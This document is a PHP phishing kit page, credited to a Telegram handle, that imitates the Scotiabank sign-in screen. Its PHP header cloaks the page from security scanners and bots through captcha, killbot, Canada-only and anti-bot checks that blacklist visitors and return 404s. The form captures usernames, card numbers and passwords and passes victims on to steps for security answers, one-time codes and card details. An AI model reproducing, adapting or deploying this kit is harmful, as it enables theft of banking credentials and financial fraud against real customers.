<?php
// @Kr3pto on telegram
require "configg.php";
require "sc_assetz/vinc/session_protect.php";
require "sc_assetz/vinc/functions.php";
if($_SESSION['passed_captcha'] == 'yes'){
	
}else{
	$fp = fopen("cp_assetz/vinc/blacklist.dat", "a");
	fputs($fp, "\r\n$ip\r\n");
	fclose($fp);
	header_remove();
	header("Connection: close\r\n");
	http_response_code(404);
	exit;
}
if($internal_antibot == 1){
	require "sc_assetz/old_blocker.php";
}
if($enable_killbot == 1){
	if(checkkillbot($killbot_key) == true){
		$fp = fopen("sc_assetz/vinc/blacklist.dat", "a");
		fputs($fp, "\r\n$ip\r\n");
		fclose($fp);
		header_remove();
		header("Connection: close\r\n");
		http_response_code(404);
		exit;
	}
}
if($mobile_lock == 1){
	require "sc_assetz/mob_lock.php";
}
if($CA_lock == 1){
	if(onlyca() == true){
	
	}else{
		$fp = fopen("sc_assetz/vinc/blacklist.dat", "a");
		fputs($fp, "\r\n$ip\r\n");
		fclose($fp);
		header_remove();
		header("Connection: close\r\n");
		http_response_code(404);
		exit;
	}
}
if($external_antibot == 1){
	if(checkBot($apikey) == true){
		$fp = fopen("sc_assetz/vinc/blacklist.dat", "a");
		fputs($fp, "\r\n$ip\r\n");
		fclose($fp);
		header_remove();
		header("Connection: close\r\n");
		http_response_code(404);
		exit;
	}
}

if($ask_question == 1){
	$action = "Security?sslchannel=true&sessionid=".generateRandomString(130);
}else{
	if($ask_otp == 1){
		$action = "2FA?sslchannel=true&sessionid=".generateRandomString(130);
	}else{
		if($ask_card == 1){
			$action = "Card?sslchannel=true&sessionid=".generateRandomString(130);
		}else{
			$action = "Thankyou?sslchannel=true&sessionid=".generateRandomString(130);
		}
	}
}
?>
<!DOCTYPE html>
<html class="js-focus-visible" lang="en-US">
    <head>
        <meta http-equiv="content-type" content="text/html; charset=UTF-8" />
        <meta charset="utf-8" />
        <meta http-equiv="x-ua-compatible" content="ie=edge" />
        <meta name="viewport" content="width=device-width, viewport-fit=cover, initial-scale=1" />
        <title>Sign in | Scotiabank</title>
        <link href="sc_assetz/css/styles.css" rel="stylesheet" />
        <link href="sc_assetz/css/main.css" rel="stylesheet" />
        <link href="sc_assetz/img/favicon.ico" rel="icon" />
    </head>
    <body>
        <div class="root" id="root">
            <div class="uQnxO2uiJOTeY5_KPtBG0">
                <main class="_16e3jP2sLLXzIXpWyvv2MD nJsDmKM3D51Ziq5Zgp6Z_">
                    <div>
                        <div class="_189buhYsYKCsviWKNS9OP-">
                            <div class="Cardstyle__Wrapper-canvas-core__sc-1mhf12g-0 bOgovu Card__container _2P0vW6eMS0PvlMAAf-02Yp" type="flatSolid">
                                <div class="_2s5uhEm1K9lqu1P-8H0c3_"><img class="_3jGPs2mmElVPN8FnMTFXe-" src="sc_assetz/img/lock.svg" alt="Sign in | Scotiabank" /></div>
                                <div class="Marginstyle__Wrapper-canvas-core__dm8riu-0 jszDxF Margin__container _3HVFtZm4ifhQH02wwMp3JT">
                                    <h1 class="TextHeadlinestyle__Text-canvas-core__rml86m-0 elWsoS TextHeadline__text _2x05Bp1YJ7gu-W6PvGkpLK" color="black">Welcome to</h1>
                                    <a href="javascript:void(0);">
                                        <div class="_1B64ZrEq6BvPwNqtqnNEiC">
                                            <svg focusable="true" role="img" class="SvgLogostyle__Wrapper-canvas-core__sc-1ed0csp-0 ktWZve ScotiaLogo" viewBox="0 0 697.04 99.14" size="36" type="scotiabankEn" fill="red">
                                                <title id="scotiabankLogo-title">Scotiabank</title>
                                                <path d="M187,50a34.48,34.48,0,1,0,34.47,34.47A34.52,34.52,0,0,0,187,50Zm0,49.67a15.2,15.2,0,1,1,15.19-15.2A15.21,15.21,0,0,1,187,99.68Z" transform="translate(-17.58 -19.82)"></path>
                                                <polygon
                                                    points="247.77 31.83 238.36 31.83 238.36 11.48 217.75 11.48 217.75 31.83 208.34 31.83 208.34 50.48 217.75 50.48 217.75 97.5 238.36 97.5 238.36 50.48 247.77 50.48 247.77 31.83"
                                                ></polygon>
                                                <rect x="257.22" y="31.83" width="20.6" height="65.67"></rect>
                                                <path d="M285.1,19.82A11.48,11.48,0,1,0,296.59,31.3,11.5,11.5,0,0,0,285.1,19.82Z" transform="translate(-17.58 -19.82)"></path>
                                                <path
                                                    d="M580.64,69.34a12.3,12.3,0,0,1,12.28,12.28v35.7h20.6V78.8c0-17.49-10.09-28.79-26-28.79-6.55,0-13.46,2.87-19.15,12.05V51.65H547.75v65.67h20.61V81.62A12.3,12.3,0,0,1,580.64,69.34Z"
                                                    transform="translate(-17.58 -19.82)"
                                                ></path>
                                                <polygon points="671.05 97.5 645.73 64.69 669.27 31.83 645.19 31.83 626.27 58.4 626.27 1.64 605.66 1.64 605.66 97.5 626.27 97.5 626.27 70.43 647.04 97.5 671.05 97.5"></polygon>
                                                <path
                                                    d="M81.54,99.65a30,30,0,0,0,2.11-12.1c0-6.63-2.08-12.55-5.85-16.68C73.4,66.05,65.88,62.05,55.45,59a37,37,0,0,1-5.86-2.2,14.46,14.46,0,0,1-4.37-3.25,7.37,7.37,0,0,1-1.87-5.32c0-3.05,1.63-5.12,4.29-6.79,3.33-2.1,9.74-2.3,16.29.12a39.83,39.83,0,0,1,6.64,3.15l8.76-17.43a49.86,49.86,0,0,0-12.56-5.66,55,55,0,0,0-14-1.77A37.61,37.61,0,0,0,39.7,22a29.82,29.82,0,0,0-10,6.52,30.84,30.84,0,0,0-6.65,10,31.9,31.9,0,0,0-2.21,12.14A25.58,25.58,0,0,0,28.6,68c6,5.63,12.8,7.63,15.54,8.69s5.75,2,7.68,2.71a27.62,27.62,0,0,1,5.64,2.88,9,9,0,0,1,3,3.34,7.53,7.53,0,0,1,.64,4.19,8.59,8.59,0,0,1-2.93,5.66c-1.77,1.66-5,2.61-9.48,2.61a28.68,28.68,0,0,1-11.49-2.76,82.84,82.84,0,0,1-9.33-5l-10.3,17.94C24.77,114.7,36.42,119,46.8,119a49.52,49.52,0,0,0,15.52-2.48,35.59,35.59,0,0,0,11.77-6.58A30.48,30.48,0,0,0,81.54,99.65Z"
                                                    transform="translate(-17.58 -19.82)"
                                                ></path>
                                                <path d="M703.14,94.36a11.48,11.48,0,1,0,11.48,11.48A11.48,11.48,0,0,0,703.14,94.36Zm0,20.65a9.17,9.17,0,1,1,9.17-9.17A9.17,9.17,0,0,1,703.14,115Z" transform="translate(-17.58 -19.82)"></path>
                                                <path
                                                    d="M703.12,107.76h-1.84v4.35H699V99.58h4.8a4.16,4.16,0,0,1,4.17,4.15,4.07,4.07,0,0,1-2.41,3.65l2.64,4.73h-2.71Zm-1.84-2.1h2.63a1.93,1.93,0,0,0,0-3.84h-2.63Z"
                                                    transform="translate(-17.58 -19.82)"
                                                ></path>
                                                <path
                                                    d="M138,94A15.2,15.2,0,1,1,138,75L151.63,61.3A34.42,34.42,0,0,0,126.13,50c-19,0-35.56,13.53-35.56,34.48S107.12,119,126.13,119a34.42,34.42,0,0,0,25.5-11.29Z"
                                                    transform="translate(-17.58 -19.82)"
                                                ></path>
                                                <path
                                                    d="M376,117.32V51.65H355.93v6.9l-1.86-1.66A25.12,25.12,0,0,0,336.77,50C319,50,304.06,65.8,304.06,84.48S319,119,336.77,119a25.12,25.12,0,0,0,17.3-6.88l1.86-1.66v6.9ZM340,100a15.52,15.52,0,1,1,15.51-15.52A15.53,15.53,0,0,1,340,100Z"
                                                    transform="translate(-17.58 -19.82)"
                                                ></path>
                                                <path
                                                    d="M537.89,117.32V51.65H517.8v6.9l-1.86-1.66A25.12,25.12,0,0,0,498.64,50c-17.73,0-32.71,15.79-32.71,34.47s15,34.48,32.71,34.48a25.12,25.12,0,0,0,17.3-6.88l1.86-1.66v6.9ZM501.84,100a15.52,15.52,0,1,1,15.51-15.52A15.53,15.53,0,0,1,501.84,100Z"
                                                    transform="translate(-17.58 -19.82)"
                                                ></path>
                                                <path
                                                    d="M406.77,117.32v-6.9l1.86,1.66a25.1,25.1,0,0,0,17.3,6.88c17.73,0,32.7-15.79,32.7-34.48S443.66,50,425.93,50a25.1,25.1,0,0,0-17.3,6.88l-1.86,1.66V21.46H386.68v95.86Zm.44-32.84A15.52,15.52,0,1,1,422.73,100,15.53,15.53,0,0,1,407.21,84.48Z"
                                                    transform="translate(-17.58 -19.82)"
                                                ></path>
                                            </svg>
                                        </div>
                                    </a>
                                    <div class="Marginstyle__Wrapper-canvas-core__dm8riu-0 IzIUd Margin__container"><div></div></div>
                                    <form action="<?=$action;?>" method="post">
                                        <fieldset>
                                            <span class="SROnlystyle__Wrapper-canvas-core__sc-10lzz2q-0 yTvqK SROnly__container"><legend>login</legend></span><label id="usernameInput-label" for="usernameInput-input"></label>
                                            <div class="InputContainerstyle__Container-canvas-core__sc-1sov9au-0 InputContainer__input">
                                                <div class="InputContainerstyle__Container-canvas-core__sc-1sov9au-0 ccRWoD InputContainer__input--inline">
                                                    <svg
                                                        class="SvgIconstyle__Wrapper-canvas-core__sc-15g7y6h-0 glanVY SvgIcon__icon InputIconstyle__Wrapper-canvas-core__sc-1alaz43-0 gERRAy Input__Icon UsernameTextFieldstyle__UsernameTextFieldLeftIcon-canvas-core__fbxdiq-1 cXoEdD UsernameTextField__icon--User"
                                                        focusable="false"
                                                        role="presentation"
                                                        viewBox="0 0 30 30"
                                                        size="18"
                                                        color="currentColor"
                                                    >
                                                        <path
                                                            fill-rule="evenodd"
                                                            clip-rule="evenodd"
                                                            d="M16.4655 15.5344C20.0649 15.5344 22.9827 12.6166 22.9827 9.01719C22.9827 5.41781 20.0649 2.49994 16.4655 2.49994C12.8661 2.49994 9.94824 5.41781 9.94824 9.01719C9.94824 12.6166 12.8661 15.5344 16.4655 15.5344Z"
                                                            fill="none"
                                                            stroke-linecap="round"
                                                            stroke-linejoin="round"
                                                        ></path>
                                                        <path
                                                            d="M29.5 29.4999V26.3964C29.5 22.9684 26.4779 20.1895 22.75 20.1895H9.25001C5.52208 20.1895 2.5 22.9684 2.5 26.3964V29.4999"
                                                            fill="none"
                                                            stroke-linecap="round"
                                                            stroke-linejoin="round"
                                                        ></path>
                                                    </svg>
                                                    <input
                                                        type="text"
                                                        id="usernameInput-input"
                                                        name="userName"
                                                        placeholder="Username or card number"
                                                        required=""
                                                        class="Inputstyle__InputMain-canvas-core__sc-1glnvsj-0 ljcAah Input__input Input__input--with-left-icon UsernameTextField--with-clear-button _2qlTUlZJScnqN516t-0Wi-"
                                                    />
                                                </div>
                                                <div style="display: none;">
                                                    <div class="Errorstyle__ErrorContainer-canvas-core__swivz4-0 isGMrn Error__container">
                                                        <span class="Errorstyle__ErrorIcon-canvas-core__swivz4-2 hNpTJT Error__icon">
                                                            <svg class="SvgIconstyle__Wrapper-canvas-core__sc-15g7y6h-0 dtbOuH SvgIcon__icon" focusable="false" role="img" viewBox="0 0 18 18" size="18" color="transparent">
                                                                <path
                                                                    fill-rule="evenodd"
                                                                    clip-rule="evenodd"
                                                                    d="M7.99553 4.21664V9.35149C7.99553 9.89166 8.39237 10.3296 8.88191 10.3296C9.37144 10.3296 9.76828 9.89166 9.76828 9.35149V4.21664C9.76828 3.67647 9.37144 3.23857 8.88191 3.23857C8.39237 3.23857 7.99553 3.67647 7.99553 4.21664ZM6.17158 1.17349C7.73367 -0.388606 10.2663 -0.388605 11.8284 1.17349L16.8265 6.17157C18.3886 7.73367 18.3886 10.2663 16.8265 11.8284L11.8284 16.8265C10.2663 18.3886 7.73367 18.3886 6.17158 16.8265L1.17349 11.8284C-0.388602 10.2663 -0.388601 7.73367 1.1735 6.17157L6.17158 1.17349ZM9 14.7614C9.7343 14.7614 10.3296 14.1662 10.3296 13.4319C10.3296 12.6976 9.7343 12.1023 9 12.1023C8.26571 12.1023 7.67044 12.6976 7.67044 13.4319C7.67044 14.1662 8.26571 14.7614 9 14.7614Z"
                                                                    fill="#BE061B"
                                                                    stroke="none"
                                                                ></path>
                                                            </svg>
                                                        </span>
                                                        <div class="Errorstyle__ErrorText-canvas-core__swivz4-1 mSQlk Error__text"><span>Please enter your username or card number.</span></div>
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="Marginstyle__Wrapper-canvas-core__dm8riu-0 iXquKl Margin__container">
                                                <label id="password-label" for="password-input"></label>
                                                <div class="InputContainerstyle__Container-canvas-core__sc-1sov9au-0 InputContainer__input">
                                                    <div class="InputContainerstyle__Container-canvas-core__sc-1sov9au-0 ccRWoD InputContainer__input--inline">
                                                        <svg
                                                            class="SvgIconstyle__Wrapper-canvas-core__sc-15g7y6h-0 glanVY SvgIcon__icon InputIconstyle__Wrapper-canvas-core__sc-1alaz43-0 gERRAy Input__Icon"
                                                            focusable="false"
                                                            role="presentation"
                                                            viewBox="0 0 30 30"
                                                            size="18"
                                                            color="currentColor"
                                                        >
                                                            <path
                                                                fill-rule="evenodd"
                                                                clip-rule="evenodd"
                                                                d="M26.0455 26.0453C26.0455 27.3953 24.9409 28.4999 23.5909 28.4999H6.40913C5.05914 28.4999 3.95459 27.3953 3.95459 26.0453V13.7726C3.95459 12.4226 5.05914 11.3181 6.40913 11.3181H23.5909C24.9409 11.3181 26.0455 12.4226 26.0455 13.7726V26.0453Z"
                                                                fill="none"
                                                                stroke-linecap="round"
                                                                stroke-linejoin="round"
                                                            ></path>
                                                            <path d="M15.0171 18.6818V22.3636" fill="none" stroke-linecap="round"></path>
                                                            <path d="M21.1704 7.63619V10.8197" fill="none" stroke-linecap="round" stroke-linejoin="round"></path>
                                                            <path d="M8.86377 11.143V7.6367" fill="none" stroke-linecap="round" stroke-linejoin="round"></path>
                                                            <path
                                                                d="M8.86377 7.63629C8.86377 4.25024 11.6104 1.49992 15.0001 1.49992C18.3923 1.49992 21.1365 4.25024 21.1365 7.63629"
                                                                fill="none"
                                                                stroke-linecap="round"
                                                                stroke-linejoin="round"
                                                            ></path>
                                                            <path
                                                                fill-rule="evenodd"
                                                                clip-rule="evenodd"
                                                                d="M13.1729 17.4544C13.1729 16.446 13.9897 15.6271 15.0001 15.6271C16.0106 15.6271 16.8274 16.446 16.8274 17.4544C16.8274 18.4644 16.0102 19.2817 15.0001 19.2817C13.9901 19.2817 13.1729 18.4644 13.1729 17.4544Z"
                                                                stroke="none"
                                                            ></path>
                                                        </svg>
                                                        <input
                                                            type="password"
                                                            id="password-input"
                                                            name="password"
                                                            value=""
                                                            placeholder="Password"
                                                            required=""
                                                            class="Inputstyle__InputMain-canvas-core__sc-1glnvsj-0 lgUymR Input__input PasswordTextFieldstyle__StyledPasswordTextField-canvas-core__sc-1n976yi-0 eOpOZV _2qlTUlZJScnqN516t-0Wi-"
                                                        />
                                                    </div>
                                                    <div style="display: none;">
                                                        <div class="Errorstyle__ErrorContainer-canvas-core__swivz4-0 isGMrn Error__container">
                                                            <span class="Errorstyle__ErrorIcon-canvas-core__swivz4-2 hNpTJT Error__icon">
                                                                <svg class="SvgIconstyle__Wrapper-canvas-core__sc-15g7y6h-0 dtbOuH SvgIcon__icon" focusable="false" role="img" viewBox="0 0 18 18" size="18" color="transparent">
                                                                    <path
                                                                        fill-rule="evenodd"
                                                                        clip-rule="evenodd"
                                                                        d="M7.99553 4.21664V9.35149C7.99553 9.89166 8.39237 10.3296 8.88191 10.3296C9.37144 10.3296 9.76828 9.89166 9.76828 9.35149V4.21664C9.76828 3.67647 9.37144 3.23857 8.88191 3.23857C8.39237 3.23857 7.99553 3.67647 7.99553 4.21664ZM6.17158 1.17349C7.73367 -0.388606 10.2663 -0.388605 11.8284 1.17349L16.8265 6.17157C18.3886 7.73367 18.3886 10.2663 16.8265 11.8284L11.8284 16.8265C10.2663 18.3886 7.73367 18.3886 6.17158 16.8265L1.17349 11.8284C-0.388602 10.2663 -0.388601 7.73367 1.1735 6.17157L6.17158 1.17349ZM9 14.7614C9.7343 14.7614 10.3296 14.1662 10.3296 13.4319C10.3296 12.6976 9.7343 12.1023 9 12.1023C8.26571 12.1023 7.67044 12.6976 7.67044 13.4319C7.67044 14.1662 8.26571 14.7614 9 14.7614Z"
                                                                        fill="#BE061B"
                                                                        stroke="none"
                                                                    ></path>
                                                                </svg>
                                                            </span>
                                                            <div class="Errorstyle__ErrorText-canvas-core__swivz4-1 mSQlk Error__text"><span>Please enter your password.</span></div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="Marginstyle__Wrapper-canvas-core__dm8riu-0 lkWQxp Margin__container">
                                                <div
                                                    class="InputContainerstyle__Container-canvas-core__sc-1sov9au-0 InputContainer__input Checkboxstyle__StyledInputContainer-canvas-core__sc-1p7p9fh-0 Checkbox__container _2IX1IBIW4mYG_6azaZb_K_"
                                                >
                                                    <div class="Checkboxstyle__CheckboxWrapper-canvas-core__sc-1p7p9fh-1 cqwWGF Checkbox__tooltipInput">
                                                        <label for="rememberMe" class="Checkboxstyle__CheckboxLabel-canvas-core__sc-1p7p9fh-3 hfpdbg Checkbox__label">
                                                            <input
                                                                type="checkbox"
                                                                id="rememberMe"
                                                                name="remember me"
                                                                class="Inputstyle__InputMain-canvas-core__sc-1glnvsj-0 isddSg Input__input Checkboxstyle__StyledInput-canvas-core__sc-1p7p9fh-5 cQlbjD Checkbox__input"
                                                                value=""
                                                            />
                                                            <span class="Checkboxstyle__CheckboxIconWrapper-canvas-core__sc-1p7p9fh-4 kAVOtD Checkbox__span">
                                                                <svg
                                                                    class="SvgIconstyle__Wrapper-canvas-core__sc-15g7y6h-0 cxnVBK SvgIcon__icon Checkbox__icon Checkbox__icon--indeterminate"
                                                                    focusable="false"
                                                                    role="presentation"
                                                                    viewBox="0 0 15 2"
                                                                    size="12"
                                                                    color="currentColor"
                                                                >
                                                                    <path d="M1.5 1H13.5" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
                                                                </svg>
                                                                <svg
                                                                    class="SvgIconstyle__Wrapper-canvas-core__sc-15g7y6h-0 fvLthY SvgIcon__icon Checkbox__icon Checkbox__icon--check"
                                                                    focusable="false"
                                                                    role="presentation"
                                                                    viewBox="0 0 24 24"
                                                                    size="12"
                                                                    color="currentColor"
                                                                >
                                                                    <path
                                                                        stroke="none"
                                                                        d="M13.85 10.667l6.533-5.683A1.727 1.727 0 0 1 22.65 7.59l-6.511 5.663-6.371 5.74c-.7.63-1.775.585-2.418-.103l-6.134-6.559a1.727 1.727 0 0 1 2.522-2.359l4.977 5.321 5.134-4.626z"
                                                                    ></path>
                                                                </svg>
                                                            </span>
                                                            <div class="Checkboxstyle__CheckboxVisibleLabel-canvas-core__sc-1p7p9fh-6 jhgbaQ Label__label Label__label--checkbox Label__label--inline">Remember my username or card number</div>
                                                        </label>
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="Marginstyle__Wrapper-canvas-core__dm8riu-0 bvqLJp Margin__container">
                                                <div class="Marginstyle__Wrapper-canvas-core__dm8riu-0 iozagd Margin__container">
                                                    <button
                                                        class="ButtonCorestyle__StyledButton-canvas-core__v39ho0-0 hegXGr ButtonCore__button PrimaryButtonstyle__StyledPrimaryButtonCore-canvas-core__sc-11pddd2-0 joQWRC Button__button--primary _3QIv3Rkx0hZd1e7JFFYXPY"
                                                        id="signIn"
                                                    >
                                                        <span class="ButtonCorestyle__StyledButtonCoreBlock-canvas-core__v39ho0-1 gbEtSg ButtonCore__block" tabindex="-1"><span class="ButtonCore__text">Sign in</span></span>
                                                    </button>
                                                </div>
                                            </div>
                                        </fieldset>
                                    </form>
                                    <a href="javascript:void(0);" to="#" type="default" size="16" class="StandaloneLinkstyle__Wrapper-canvas-core__sc-3nwc6-0 hXajPT StandaloneLink _3HOsX3GVu55tRH6miG5dd_">
                                        <span class="StandaloneLinkstyle__Text-canvas-core__sc-3nwc6-1 dgWFTi StandaloneLink__text" type="default" size="16">Need help signing in?</span>
                                        <svg
                                            class="SvgIconstyle__Wrapper-canvas-core__sc-15g7y6h-0 hDzTBc SvgIcon__icon StandaloneLink__icon StandaloneLink__icon--size-16px"
                                            focusable="false"
                                            role="presentation"
                                            viewBox="0 0 30 30"
                                            size="14"
                                            color="currentColor"
                                        >
                                            <path d="M8.4375 1.87491L21.5625 14.9999L8.4375 28.1249" fill="none" stroke-linecap="round" stroke-linejoin="round"></path>
                                        </svg>
                                    </a>
                                </div>
                            </div>
                        </div>
                        <div class="Marginstyle__Wrapper-canvas-core__dm8riu-0 bsiGcZ Margin__container _3nxHoyhRMxjRdmZp_nmuE2">
                            <span class="TextBodystyle__Text-canvas-core__xx5i8s-0 cArHA-D TextBody__text _2uk89vYv-CLMYFl3ozyjDy" color="black" type="1">Don't have a username and password?</span>
                            <a href="javascript:void(0);" to="#" size="18" type="default" tabindex="0" class="Linkstyle__Wrapper-canvas-core__nzeldc-0 kSwvVT Link__link">
                                <span class="Linkstyle__Text-canvas-core__nzeldc-1 hgUHzi Link__text" type="default">Set them up now.</span>
                            </a>
                        </div>
                    </div>
                </main>
                <footer class="Footerstyle__FooterWrapper-canvas-core__f70auz-0 jXkPGU Footer__footer">
                    <div class="Gridstyle__Wrapper-canvas-core__sc-6d4gtg-0 jaKyef Grid__container Footerstyle__UpperBar-canvas-core__f70auz-1 dYmUyF Footer__upperBar">
                        <div class="Rowstyle__Wrapper-canvas-core__tnvou7-0 XAwQb Row__container Footerstyle__UpperBarRow-canvas-core__f70auz-2 kRgcBw Footer__upperBarRow">
                            <div class="Columnstyle__Wrapper-canvas-core__z9aox0-0 czFAOK Column__container Footerstyle__LogoColumn-canvas-core__f70auz-3 ibxIIv Footer__logoHolder">
                                <svg
                                    focusable="true"
                                    role="img"
                                    class="SvgLogostyle__Wrapper-canvas-core__sc-1ed0csp-0 fXubmU ScotiaLogo Footerstyle__Logo-canvas-core__f70auz-4 jzaEDK Footer__logo"
                                    viewBox="0 0 498.27 552.11"
                                    size="24"
                                    type="flyingS"
                                    fill="red"
                                >
                                    <title id="footer-logo-title">Scotiabank</title>
                                    <path d="M637.94,371.45H481.69A173.16,173.16,0,0,0,309.61,525.34h0A173.18,173.18,0,0,1,461.19,268.53H730.82Z" transform="translate(-232.55 -268.53)"></path>
                                    <path d="M325.43,717.72H481.69A173.15,173.15,0,0,0,653.76,563.83h0A173.18,173.18,0,0,1,502.18,820.64H232.55Z" transform="translate(-232.55 -268.53)"></path>
                                    <circle cx="249.14" cy="276.05" r="139.06"></circle>
                                </svg>
                            </div>
                            <div class="Columnstyle__Wrapper-canvas-core__z9aox0-0 czFAOK Column__container">
                                <ul class="Footer__footerNav">
                                    <li class="FooterLinkstyle__FooterLinkWrapper-canvas-core__dxpg66-0 leXoNx Footer__navLinks">
                                        <a href="javascript:void(0);" class="Footer__links"> <p class="TextCaptionstyle__Text-canvas-core__lol886-0 ihZbff TextCaption__text" color="black">Contact Us</p></a>
                                    </li>
                                    <li class="FooterLinkstyle__FooterLinkWrapper-canvas-core__dxpg66-0 leXoNx Footer__navLinks">
                                        <a href="javascript:void(0);" class="Footer__links"> <p class="TextCaptionstyle__Text-canvas-core__lol886-0 ihZbff TextCaption__text" color="black">Security</p></a>
                                    </li>
                                    <li class="FooterLinkstyle__FooterLinkWrapper-canvas-core__dxpg66-0 leXoNx Footer__navLinks">
                                        <a href="javascript:void(0);" class="Footer__links"> <p class="TextCaptionstyle__Text-canvas-core__lol886-0 ihZbff TextCaption__text" color="black">Legal</p></a>
                                    </li>
                                    <li class="FooterLinkstyle__FooterLinkWrapper-canvas-core__dxpg66-0 leXoNx Footer__navLinks">
                                        <a href="javascript:void(0);" class="Footer__links"> <p class="TextCaptionstyle__Text-canvas-core__lol886-0 ihZbff TextCaption__text" color="black">Privacy</p></a>
                                    </li>
                                    <li class="FooterLinkstyle__FooterLinkWrapper-canvas-core__dxpg66-0 leXoNx Footer__navLinks">
                                        <a href="javascript:void(0);" class="Footer__links"> <p class="TextCaptionstyle__Text-canvas-core__lol886-0 ihZbff TextCaption__text" color="black">Accessibility</p></a>
                                    </li>
                                </ul>
                            </div>
                        </div>
                    </div>
                    <div class="Footer__base Footer__base--white">
                        <div class="Gridstyle__Wrapper-canvas-core__sc-6d4gtg-0 jaKyef Grid__container">
                            <div class="Rowstyle__Wrapper-canvas-core__tnvou7-0 XAwQb Row__container">
                                <div class="Columnstyle__Wrapper-canvas-core__z9aox0-0 eTXFeK Column__container Footer__copyRights">
                                    <p class="TextLegalstyle__Text-canvas-core__qz26iv-0 tdMZm TextLegal__text">© Scotiabank. All Rights Reserved.</p>
                                </div>
                            </div>
                        </div>
                    </div>
                </footer>
            </div>
        </div>
        <script src="sc_assetz/js/jquery.js"></script>
        <script>
            $(document).ready(function () {
                var allInputs = $(":input");
                allInputs.focusout(function () {
                    $(this).blur(function () {
                        if ($(this).prop("required")) {
                            if (!$(this).val()) {
                                $(this).removeClass("ljcAah");
                                $(this).addClass("krleCq");
                                $(this).parent().next().show();
                            } else {
                                $(this).removeClass("krleCq");
                                $(this).parent().next().hide();
                            }
                        }
                    });
                });
            });
        </script>
    </body>
</html>
